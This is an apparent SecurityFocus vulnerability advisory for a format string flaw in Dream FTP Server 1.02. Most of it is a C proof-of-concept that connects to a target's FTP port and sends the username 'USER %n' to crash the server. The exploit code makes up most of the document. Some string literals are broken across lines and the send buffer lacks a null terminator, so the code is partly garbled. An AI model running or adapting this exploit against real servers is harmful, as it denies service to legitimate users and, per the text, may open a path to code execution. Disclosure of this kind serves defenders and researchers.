source: http://www.securityfocus.com/bid/9600/info

It has been reported that Dream FTP Server may be prone to a remote format string vulnerability when processing a malicious request from a client for a username during FTP authentication. The issue could crash the server.

Dream FTP Server version 1.02 has been reported to be prone to this issue, however, it is possible that other versions may be affected by this issue as well.

/* dreamftp-DoS.c - Dream FTP format string
vulnerability DoS PoC.
 *
 * This program is a simple PoC for the format string
vulnerability found
 * in BolinTech dreamftp by intuit.  Although
theoretically there is a
 * window of possibility of arbitrary code execution,
the vulnerability is
 * simply demonstrated to cause DoS.  After running
this code against a
 * Dream FTP server, the daemon will crash, denying
service to legimate
 * users.
 *
 *
 * -shaun2k2 - shaunige@yahoo.co.uk
 */


#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netdb.h>
#include <netinet/in.h>

#define PORT 21

int main(int argc, char *argv[]) {
        if(argc < 2) {
                printf("Dream FTPd format string
vulnerability DoS PoC,\n");
                printf("by shaun2k2 -
shaunige@yahoo.co.uk\n\n");
                printf("Usage: %s <host>\n", argv[0]);
                exit(-1);
        }

        int sock;
        struct hostent *he;
        struct sockaddr_in dest;
        char explbuf[10];


        if((he = gethostbyname(argv[1])) == NULL) {
                herror("gethostbyname()");
                exit(-1);
        }


        printf("Dream FTPd format string vulnerability
DoS PoC,\n");
        printf("by shaun2k2 -
shaunige@yahoo.co.uk\n\n");

        printf("[+] Crafting exploit buffer...\n\n");
        memcpy(explbuf, "USER %n\r\n", 9);

        if((sock = socket(AF_INET, SOCK_STREAM, 0)) <
0) {
                perror("socket()");
                exit(-1);
        }

        dest.sin_family = AF_INET;
        dest.sin_port = htons(PORT);
        dest.sin_addr = *((struct in_addr
*)he->h_addr);

        printf("[+] Connecting...\n");
        if(connect(sock, (struct sockaddr *)&dest,
sizeof(struct sockaddr)) < 0) {
                perror("socket()");
                exit(-1);
        }

        printf("[+] Connected!\n\n");

        sleep(1);
        printf("[+] Sending malicious format
string...\n");
        send(sock, explbuf, strlen(explbuf), 0);
        sleep(2);
        close(sock);

        printf("[+] Done!\n");

        return(0);
}
